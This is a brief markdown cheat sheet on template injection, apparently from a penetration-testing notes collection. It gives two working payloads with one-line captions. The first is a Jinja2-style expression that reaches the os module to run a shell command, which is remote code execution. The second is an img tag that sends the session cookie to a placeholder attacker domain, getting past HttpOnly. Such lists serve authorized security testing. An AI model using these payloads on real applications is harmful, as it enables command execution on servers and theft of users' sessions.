# Template Injection

## Table of Contents
- [RCE](#rce)
- [Client-Side Protection Bypass](#client-side-protection-bypass)

## RCE

### Arbitrary commands can be executed remotely.

- RCE
  ```python
  {{ self._TemplateReference__context.config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
  ```

## Client-Side Protection Bypass

### Client-side protections can be bypassed.

- Bypassing HttpOnly and Exfiltrating Session Cookie Value
  ```javascript
  <img src=https://[ATTACKER-DOMAIN]/?cookie={{request.cookies.session}}>
  ```